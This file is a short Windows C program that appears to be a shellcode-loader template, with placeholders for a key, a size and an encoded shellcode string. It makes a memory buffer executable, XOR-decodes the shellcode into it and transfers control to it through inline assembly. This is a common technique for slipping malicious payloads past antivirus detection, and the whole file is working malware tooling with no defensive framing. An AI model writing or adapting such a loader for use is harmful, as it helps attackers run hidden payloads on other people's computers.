#include <windows.h>

int main() {

    DWORD key = {KEY};
    DWORD dwSize = {SIZE};
    DWORD dwProtection = 0;
    CHAR *shellcode = GlobalAlloc(GPTR, dwSize);
    VirtualProtect(shellcode, dwSize, PAGE_EXECUTE_READWRITE, &dwProtection);

    strcpy(shellcode, "{SHELLCODE}");

    DWORD *current;
    int i = 0;
    for(i; i < dwSize / 4; i++) {
        current = (DWORD*)shellcode;
        *current = *current ^ key;
        shellcode += 4;
    }
    shellcode -= dwSize;

    asm ("mov %0, %%eax\n\t"
         "push %%eax\n\t"
         "ret"
         :
         : "r" (shellcode));

    // We are probably never going to reach that point
    GlobalFree(shellcode);
    return 0;
}
